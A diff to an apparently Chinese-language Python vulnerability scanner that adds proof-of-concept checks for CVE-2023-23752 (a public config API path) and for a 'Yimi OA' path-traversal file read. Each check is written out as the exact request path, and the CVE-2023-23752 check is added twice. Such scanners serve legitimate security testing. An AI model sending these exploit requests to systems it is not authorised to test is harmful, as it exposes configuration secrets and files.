@@ -1,4 +1,4 @@
-from POC import CVE_2020_27986
+from POC import CVE_2020_27986, PocFun
 from POC import CNVD_2021_30167
 from POC import CVE_2021_36749
 import argparse
@@ -55,6 +55,15 @@ def check_POC(in_url, timeout=6):
         main.print_green()
         check_num = check_num + 1
 
+    re = PocFun.pocfuntion(pocname='CVE-2023-23752',
+                           url=turl,
+                           addurl='/api/index.php/v1/config/application?public=true',
+                           includelist='links'
+                           )
+    if '成功' in re:
+        main.print_green(context=re)
+        check_num = check_num + 1
+
     re = CVE_2021_36749.Apache_Druid_any_path(inurl=turl, timeout=timeout)
     if '返回成功' in re:
         main.print_green(context=re)
@@ -100,6 +109,22 @@ def check_POC(in_url, timeout=6):
         main.print_green(context=re)
         check_num = check_num + 1
 
+    re = PocFun.pocfuntion(pocname='一米OA 任意文件读取漏洞',
+                           url=turl,
+                           addurl='/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp'
+                           )
+    if '成功' in re:
+        main.print_green(context=re)
+        check_num = check_num + 1
+
+    re = PocFun.pocfuntion(pocname='CVE-2023-23752',
+                           url=turl,
+                           addurl='/api/index.php/v1/config/application?public=true',
+                           includelist='links'
+                           )
+    if '成功' in re:
+        main.print_green(context=re)
+        check_num = check_num + 1
 
     main.print_yellow(f'一共检测到{check_num}个漏洞')
 
